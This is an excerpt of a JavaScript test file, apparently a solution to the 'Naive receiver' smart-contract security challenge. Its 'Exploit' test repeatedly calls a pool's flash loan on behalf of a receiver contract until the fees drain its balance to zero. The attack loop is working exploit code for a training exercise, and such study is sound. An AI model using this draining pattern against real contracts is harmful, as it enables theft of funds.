...
describe('[Challenge] Naive receiver', function () {
    ...
    it('Exploit', async function () {
        ...
        while(true) {
            const flashAmount =(await ethers.provider.getBalance(this.receiver.address)).sub(await this.pool.fixedFee())
            await this.pool.connect(attacker).flashLoan(this.receiver.address, flashAmount)

            const receiverBalance = await ethers.provider.getBalance(
              this.receiver.address
            );
            if (receiverBalance.isZero()) {return;}
        }
    });
